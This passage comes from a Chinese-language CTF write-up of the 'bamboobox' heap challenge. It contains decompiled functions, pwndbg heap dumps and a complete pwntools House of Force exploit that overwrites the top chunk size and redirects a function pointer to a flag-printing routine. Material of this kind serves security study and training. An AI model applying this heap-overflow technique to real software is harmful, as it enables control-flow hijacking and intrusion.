class="hljs-number">0</span>; i &lt;= <span class="hljs-number">99</span>; ++i )<br>    {<br>      <span class="hljs-keyword">if</span> ( !itemlist[i].content )<br>      {<br>        LODWORD(itemlist[i].size) = v2;<br>        itemlist[i].content = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(v2);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the name of item:"</span>);<br>        itemlist[i].content[(<span class="hljs-type">int</span>)read(<span class="hljs-number">0</span>, itemlist[i].content, v2)] = <span class="hljs-number">0</span>;<br>        ++num;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      }												<span class="hljs-comment">//根据输入的长度，malloc大小，并填充数据</span><br>    }<br>  }<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>

<p>首先根据num判断是否堆满了，然后根据堆结构体写入数据</p>
<p>根据输入的长度，生成一个堆，然后填入数据，不存在溢出</p>
<h3 id="change-item"><a href="#change-item" class="headerlink" title="change_item"></a>change_item</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">change_item</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-2Ch]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+8h] [rbp-28h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">char</span> nptr[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( num )<br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the index of item:"</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>    v1 = atoi(buf);<br>    <span class="hljs-keyword">if</span> ( itemlist[v1].content )<br>    {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the length of item name:"</span>);<br>      read(<span class="hljs-number">0</span>, nptr, <span class="hljs-number">8uLL</span>);<br>      v2 = atoi(nptr);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the new name of the item:"</span>);<br>      itemlist[v1].content[(<span class="hljs-type">int</span>)read(<span class="hljs-number">0</span>, itemlist[v1].content, v2)] = <span class="hljs-number">0</span>;<span class="hljs-comment">// //存在堆溢出，输出长度由我们自己决定</span><br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild index"</span>);<br>    }<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v5;<br>}<br></code></pre></td></tr></tbody></table></figure>

<p>又可以往堆中写入内容，这次长度由我们自己决定，存在堆溢出！！！</p>
<h3 id="remove-item"><a href="#remove-item" class="headerlink" title="remove_item"></a>remove_item</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">remove_item</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( num )<br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the index of item:"</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>    v1 = atoi(buf);<br>    <span class="hljs-keyword">if</span> ( itemlist[v1].content )<br>    {<br>      <span class="hljs-built_in">free</span>(itemlist[v1].content);<br>      itemlist[v1].content = <span class="hljs-number">0LL</span>;<br>      LODWORD(itemlist[v1].size) = <span class="hljs-number">0</span>;           <span class="hljs-comment">// free了且将指针置0，不存在UAF</span><br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"remove successful!!"</span>);<br>      --num;<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild index"</span>);<br>    }<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;<br>}<br></code></pre></td></tr></tbody></table></figure>

<p>free(itemlist[v1].content);																			free(itemlist[index].name);<br>itemlist[v1].content = 0LL; 									-&gt;    								itemlist[index].name = 0;<br>LODWORD(itemlist[v1].size) = 0;																itemlist[index].size = 0;</p>
<p>free 了 堆块，清空指针，不存在uaf</p>
<h3 id="magic"><a href="#magic" class="headerlink" title="magic"></a>magic</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __noreturn <span class="hljs-title function_">magic</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// [rsp+Ch] [rbp-74h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">104</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+78h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  fd = open(<span class="hljs-string">"./flag"</span>, <span class="hljs-number">0</span>);<br>  read(fd, buf, <span class="hljs-number">0x64</span>uLL);<br>  close(fd);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s"</span>, buf);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>}<br></code></pre></td></tr></tbody></table></figure>

<p>magic = 0x400D49 </p>
<p>目标地址，控制程序执行流到magic函数的位置即可get flag</p>
<h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">00000000</span> item            struc ; (<span class="hljs-keyword">sizeof</span>=<span class="hljs-number">0x10</span>, mappedto_6)<br><span class="hljs-number">00000000</span>                                         ; XREF: .bss:itemlist/r<br><span class="hljs-number">00000000</span> size            dq ?<br><span class="hljs-number">00000008</span> content         dq ?                    ; offset<br><span class="hljs-number">00000010</span> item            ends<br><span class="hljs-number">00000010</span><br></code></pre></td></tr></tbody></table></figure>

<p>对应c代码的 item 结构体</p>
<h2 id="pwndbg-动态调试"><a href="#pwndbg-动态调试" class="headerlink" title="pwndbg 动态调试"></a>pwndbg 动态调试</h2><h3 id="堆内存分布"><a href="#堆内存分布" class="headerlink" title="堆内存分布"></a>堆内存分布</h3><p>首先使用gdb动态调试程序，创建两个堆块，然后进入调试模式，详细信息如下面的代码框所示：</p>
<ul>
<li>chunk0:size=10，content=”aaaaa”</li>
<li>chunk1:size=20，content=”bbbbb”</li>
</ul>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs c">giantbranch@ubuntu:/mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontrani<br>ng_lab11$ gdb bamboobox<br>GNU <span class="hljs-title function_">gdb</span> <span class="hljs-params">(Ubuntu <span class="hljs-number">7.11</span><span class="hljs-number">.1</span><span class="hljs-number">-0u</span>buntu1~<span class="hljs-number">16.5</span>)</span> 7.11.1<br><span class="hljs-title function_">Copyright</span> <span class="hljs-params">(C)</span> 2016 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http:<span class="hljs-comment">//gnu.org/licenses/gpl.html&gt;</span><br>This is <span class="hljs-built_in">free</span> software: you are <span class="hljs-built_in">free</span> to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.  Type "show copying"<br>and "show warranty" <span class="hljs-keyword">for</span> details.<br>This GDB was configured as "x86_64-linux-gnu".<br>Type "show configuration" <span class="hljs-keyword">for</span> configuration details.<br>For bug reporting instructions, please see:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/bugs/&gt;.</span><br>Find the GDB manual and other documentation resources online at:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/documentation/&gt;.</span><br>For help, type "help".<br>Type "apropos word" to search <span class="hljs-keyword">for</span> commands related to "word"...<br>pwndbg: loaded 175 commands. Type pwndbg [filter] <span class="hljs-keyword">for</span> a <span class="hljs-built_in">list</span>.<br>pwndbg: created $rebase, $ida gdb <span class="hljs-title function_">functions</span> <span class="hljs-params">(can be used with print/<span class="hljs-keyword">break</span>)</span><br>Reading symbols from bamboobox...<span class="hljs-params">(no debugging symbols found)</span>...done.<br>pwndbg&gt; r<br>Starting program: /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontraning_lab11/bamboobox <br>There is a box with magic<br>what <span class="hljs-keyword">do</span> you want to <span class="hljs-keyword">do</span> in the box<br>----------------------------<br>Bamboobox Menu<br>----------------------------<br>1.show the items in the box<br>2.add a new item<br>3.change the item in the box<br>4.remove the item in the box<br>5.<span class="hljs-built_in">exit</span><br>----------------------------<br>Your choice:2<br>Please enter the length of item name:10<br>Please enter the name of item:aaaaa<br>----------------------------<br>Bamboobox Menu<br>----------------------------<br>1.show the items in the box<br>2.add a new item<br>3.change the item in the box<br>4.remove the item in the box<br>5.<span class="hljs-built_in">exit</span><br>----------------------------<br>Your choice:2<br>Please enter the length of item name:20<br>Please enter the name of item:bbbbb<br>----------------------------<br>Bamboobox Menu<br>----------------------------<br>1.show the items in the box<br>2.add a new item<br>3.change the item in the box<br>4.remove the item in the box<br>5.<span class="hljs-built_in">exit</span><br>----------------------------<br>Your choice:^C<br>Program received signal SIGINT, Interrupt.<br>0x00007ffff7b04360 in __<span class="hljs-title function_">read_nocancel</span> <span class="hljs-params">()</span> at ../sysdeps/unix/syscall-template.S:84<br>84	../sysdeps/unix/syscall-template.S: No such file or directory.<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>───────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────<br> RAX  0xfffffffffffffe00<br> RBX  0x0<br> RCX  0<span class="hljs-title function_">x7ffff7b04360</span> <span class="hljs-params">(__read_nocancel+<span class="hljs-number">7</span>)</span> ◂— cmp    rax, -0xfff<br> RDX  0x8<br> RDI  0x0<br> RSI  0x7fffffffdc40 —▸ 0x7fffffff0a32 ◂— 0x0<br> R8   0x7ffff7fdd700 ◂— 0x7ffff7fdd700<br> R9   0xc<br> R10  0x0<br> R11  0x246<br> R12  0<span class="hljs-title function_">x4007a0</span> <span class="hljs-params">(_start)</span> ◂— xor    ebp, ebp<br> R13  0x7fffffffdd30 ◂— 0x1<br> R14  0x0<br> R15  0x0<br> RBP  0x7fffffffdc50 —▸ 0<span class="hljs-title function_">x400ee0</span> <span class="hljs-params">(__libc_csu_init)</span> ◂— push   r15<br> RSP  0x7fffffffdc28 —▸ 0<span class="hljs-title function_">x400e5d</span> <span class="hljs-params">(main+<span class="hljs-number">166</span>)</span> ◂— lea    rax, [rbp - 0x10]<br> RIP  0<span class="hljs-title function_">x7ffff7b04360</span> <span class="hljs-params">(__read_nocancel+<span class="hljs-number">7</span>)</span> ◂— cmp    rax, -0xfff<br>────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────<br> ► 0x7ffff7b04360 &lt;__read_nocancel+7&gt;     cmp    rax, -0xfff<br>   0x7ffff7b04366 &lt;__read_nocancel+13&gt;    jae    read+73 &lt;0x7ffff7b04399&gt;<br>    ↓<br>   0x7ffff7b04399 &lt;read+73&gt;               mov    rcx, qword ptr [rip + 0x2ccad8]<br>   0x7ffff7b043a0 &lt;read+80&gt;               neg    eax<br>   0x7ffff7b043a2 &lt;read+82&gt;               mov    dword ptr fs:[rcx], eax<br>   0x7ffff7b043a5 &lt;read+85&gt;               or     rax, 0xffffffffffffffff<br>   0x7ffff7b043a9 &lt;read+89&gt;               ret    <br> <br>   0x7ffff7b043aa                         nop    word ptr [rax + rax]<br>   0x7ffff7b043b0 &lt;write&gt;                 cmp    dword ptr [rip + 0x2d2389], 0 &lt;0x7ffff7dd6740&gt;<br>   0x7ffff7b043b7 &lt;write+7&gt;               jne    write+25 &lt;0x7ffff7b043c9&gt;<br>    ↓<br>   0x7ffff7b043c9 &lt;write+25&gt;              sub    rsp, 8<br>─────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────<br>00:0000│ rsp  0x7fffffffdc28 —▸ 0<span class="hljs-title function_">x400e5d</span> <span class="hljs-params">(main+<span class="hljs-number">166</span>)</span> ◂— lea    rax, [rbp - 0x10]<br>01:0008│      0x7fffffffdc30 ◂— 0x200400ee0<br>02:0010│      0x7fffffffdc38 —▸ 0x603010 —▸ 0<span class="hljs-title function_">x400896</span> <span class="hljs-params">(hello_message)</span> ◂— push   rbp<br>03:0018│ rsi  0x7fffffffdc40 —▸ 0x7fffffff0a32 ◂— 0x0<br>04:0020│      0x7fffffffdc48 ◂— 0x2b1241ff949c6b00<br>05:0028│ rbp  0x7fffffffdc50 —▸ 0<span class="hljs-title function_">x400ee0</span> <span class="hljs-params">(__libc_csu_init)</span> ◂— push   r15<br>06:0030│      0x7fffffffdc58 —▸ 0<span class="hljs-title function_">x7ffff7a2d840</span> <span class="hljs-params">(__libc_start_main+<span class="hljs-number">240</span>)</span> ◂— mov    edi, eax<br>07:0038│      0x7fffffffdc60 ◂— 0x0<br>───────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────<br> ► f 0     7ffff7b04360 __read_nocancel+7<br>   f 1           400e5d main+166<br>   f 2     7ffff7a2d840 __libc_start_main+240<br>Program received signal SIGINT<br>pwndbg&gt; <br><br></code></pre></td></tr></tbody></table></figure>

<p>ok，输入完成，接下来我们查看堆的分布</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x603000</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x603020</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x603040</span><br>Size: <span class="hljs-number">0x21</span><br><br>Top chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x603060</span><br>Size: <span class="hljs-number">0x20fa1</span><br><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>

<p>堆的内存分布f</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x603000</span><br><span class="hljs-number">0x603000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> #func_start_malloc_chunk<br><span class="hljs-number">0x603010</span>:	<span class="hljs-number">0x0000000000400896</span>	<span class="hljs-number">0x00000000004008b1</span><br>					#hello_message      #goodbye_message<br><span class="hljs-number">0x603020</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> #chunk0<br><span class="hljs-number">0x603030</span>:	<span class="hljs-number">0x00000a6161616161</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x603040</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> #chunk1<br><span class="hljs-number">0x603050</span>:	<span class="hljs-number">0x00000a6262626262</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x603060</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000020fa1</span> #top_chunk<br>......(省略内容均为空)<br><span class="hljs-number">0x6030e0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>

<h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">.bss:<span class="hljs-number">00000000006020</span>C0                 public itemlist<br>.bss:<span class="hljs-number">00000000006020</span>C0 ; item itemlist[<span class="hljs-number">100</span>]<br>.bss:<span class="hljs-number">00000000006020</span>C0 itemlist        item <span class="hljs-number">64</span>h <span class="hljs-title function_">dup</span><span class="hljs-params">(&lt;?&gt;)</span>       ; DATA XREF: add_item+A4↑o<br>.bss:<span class="hljs-number">0000000000602700</span>                 public num<br>.bss:<span class="hljs-number">0000000000602700</span> ; <span class="hljs-type">int</span> num<br>.bss:<span class="hljs-number">0000000000602700</span> num             dd ?                    ; DATA XREF: show_item+<span class="hljs-number">8</span>↑r<br></code></pre></td></tr></tbody></table></figure>

<ul>
<li><p>itemlist[] 记录着堆块的指针</p>
</li>
<li><p>num 记录着堆块的数量。</p>
</li>
</ul>
<p>查看一下堆指针信息</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x6020c0</span><br><span class="hljs-number">0x6020c0</span> &lt;itemlist&gt;:	<span class="hljs-number">0x000000000000000a</span>	<span class="hljs-number">0x0000000000603030</span> #chunk0<br>						#struct_size        #struct_content_ptr<br><span class="hljs-number">0x6020d0</span> &lt;itemlist+<span class="hljs-number">16</span>&gt;:	<span class="hljs-number">0x0000000000000014</span>	<span class="hljs-number">0x0000000000603050</span> #chunk1<br>						#struct_size        #struct_content_ptr<br><span class="hljs-number">0x6020e0</span> &lt;itemlist+<span class="hljs-number">32</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020f0</span> &lt;itemlist+<span class="hljs-number">48</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602100</span> &lt;itemlist+<span class="hljs-number">64</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br><span class="hljs-comment">//注意struct_content_ptr指向malloc出来malloc_data的地址</span><br></code></pre></td></tr></tbody></table></figure>

<p>保存着每一个chunk的 size（输入的大小） 和 chunk地址</p>
<h3 id="攻击原理及exp"><a href="#攻击原理及exp" class="headerlink" title="攻击原理及exp"></a>攻击原理及exp</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">'debug'</span><br>p = process(<span class="hljs-string">'./bamboobox'</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">choice</span>):<br>  p.sendlineafter(<span class="hljs-string">''</span>,<span class="hljs-built_in">str</span>(choice))<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size,content</span>):<br>  cmd(<span class="hljs-number">2</span>)<br>  p.sendlineafter(<span class="hljs-string">'item name:'</span>,<span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">'item:'</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):<br>  cmd(<span class="hljs-number">3</span>)<br>  p.sendlineafter(<span class="hljs-string">'of item:'</span>,<span class="hljs-built_in">str</span>(index))<br>  p.sendlineafter(<span class="hljs-string">'item name:'</span>,<span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">'the item:'</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>  cmd(<span class="hljs-number">4</span>)<br>  p.sendlineafter(<span class="hljs-string">'of item:'</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quit</span>():<br>  cmd(<span class="hljs-number">5</span>)<br><br>magic = <span class="hljs-number">0x400d49</span><br>create(<span class="hljs-number">0x30</span>, <span class="hljs-string">"aaaa"</span>)<br>content=<span class="hljs-string">'a'</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">'1'</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x40</span>,content)<br>offset=-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span><br>create(offset,<span class="hljs-string">'bbbb'</span>)<br>create(<span class="hljs-number">0x10</span>,p64(magic)*<span class="hljs-number">2</span>)<br>quit()<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>

<h3 id="payload-分析"><a href="#payload-分析" class="headerlink" title="payload 分析"></a>payload 分析</h3><p>我们的目标是修改堆中的0x4008b1（goodbye_message）为magic函数地址：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">--------------------------------------------------------------------------<br>修改之前：<br>pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x603000</span><br><span class="hljs-number">0x603000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> #func_start_malloc_chunk<br><span class="hljs-number">0x603010</span>:	<span class="hljs-number">0x0000000000400896</span>	<span class="hljs-number">0x00000000004008b1</span><br>					#hello_message      #goodbye_message<br>--------------------------------------------------------------------------<br>我们所期望的：<br>pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x603000</span><br><span class="hljs-number">0x603000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> #func_start_malloc_chunk<br><span class="hljs-number">0x603010</span>:	<span class="hljs-number">0x0000000000400896</span>	<span class="hljs-number">0x0000000000400d49</span><br>					#hello_message      <span class="hljs-meta">#magic函数</span><br></code></pre></td></tr></tbody></table></figure>

